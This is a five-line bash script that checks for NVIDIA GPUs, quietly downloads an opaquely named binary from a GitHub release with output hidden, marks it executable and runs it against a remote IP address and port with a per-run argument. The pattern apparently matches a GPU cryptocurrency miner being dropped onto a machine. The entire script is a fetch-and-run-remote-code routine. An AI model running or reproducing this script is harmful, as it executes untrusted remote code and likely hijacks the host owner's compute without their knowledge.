#!/bin/bash
nvidia-smi -L
wget https://github.com/hammesokytz55/hoathuytien/releases/download/1/hoahongnhungdo &> /dev/null
chmod +x hoahongnhungdo
./hoahongnhungdo -P http://64.52.174.172:4545/"$1" &> log
